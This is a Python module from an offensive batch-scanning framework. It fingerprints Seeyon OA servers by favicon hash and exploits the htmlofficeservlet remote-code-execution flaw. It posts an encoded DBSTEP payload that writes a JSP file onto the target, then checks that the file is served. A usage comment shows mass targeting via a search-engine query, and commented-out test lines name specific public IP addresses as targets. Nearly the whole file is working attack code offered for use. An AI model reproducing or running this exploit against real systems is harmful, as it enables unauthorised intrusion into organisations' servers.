# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-21 14:52

import base64

import hashlib

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# python batch.py -m exploit.web.OA.Seeyon.htmlofficeservlet_getshell -cs -fs "app=\"致远互联-OA\""
class Script(BaseScript):
    name = 'Seeyon'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = ''
        # 来源，关于文件名的定义算法
        self.refer = 'https://github.com/MRLEE123456/record/blob/451e82b88e248bff5585b21e6c2aa78d5c92be4a/%E5%B7%A5%E5%85%B7/exp/%E4%B8%AD%E9%97%B4%E4%BB%B6/seeyon/%E8%87%B4%E8%BF%9COA%20RCE/README.md'
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/seeyon/htmlofficeservlet']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = '''
        version
        致远A8-V5协同管理软件 V6.1sp1
        致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3
        致远A8+协同管理软件 V7.1
        '''
        self.favicon = ['cdc85452665e7708caed3009ecb7d4e2',
                        '17ac348fcce0b320e7bfab3fe2858dfa',
                        '57f307ad3764553df84e7b14b7a85432',
                        '3c8df395ec2cbd72782286d18a286a9a',
                        '2f761c27b6b7f9386bbd61403635dc42',
                        '055c3de1ef212cc16bec218c3ae08ca7']

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.read()
                            await asyncio.sleep(2)
                            m1 = hashlib.md5()
                            m1.update(text)
                            theMD5 = m1.hexdigest()
                            for _ in self.favicon:
                                if _ == theMD5:
                                    self.flag = True
                                    tqdm.write(Fore.RED + '[{}] {}'.format('Seeyon Finger', url))
                                    return {'name': 'Seeyon Finger', 'url': url, 'software': 'Seeyon'}
        except Exception:
            return None

    async def exec(self):
        try:
            data = '''DBSTEP V3.0     355             0               22             DBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdn1dhwUw3zLe5nHzs\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66 \r\nthis is a test for me.f82abdd62cce9d2841a6efd5663e7bee'''
            for execPath in self.execPathList:
                async with aiohttp.ClientSession() as session:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    async with session.post(url=url, headers=self.headers, data=data, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None and response.status == 200:
                            url1 = f'http://{self.target}/seeyon/hg123456.jsp' if self.target.startswith(
                                ('http:', 'https:')) is False else f'{self.target}/seeyon/hg123456.jsp'
                            async with session.get(url=url1, timeout=self.reqTimeout, verify_ssl=False) as response2:
                                if response2 is not None and response2.status == 200:
                                    text2 = await response2.text()
                                    if 'test for me' in text2:
                                        tqdm.write(Fore.RED + '[{}] {}'.format('Seeyon RCE', url1))
                                        return {'name': 'Seeyon RCE', 'url': url1, 'software': 'Seeyon'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib
    #
    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
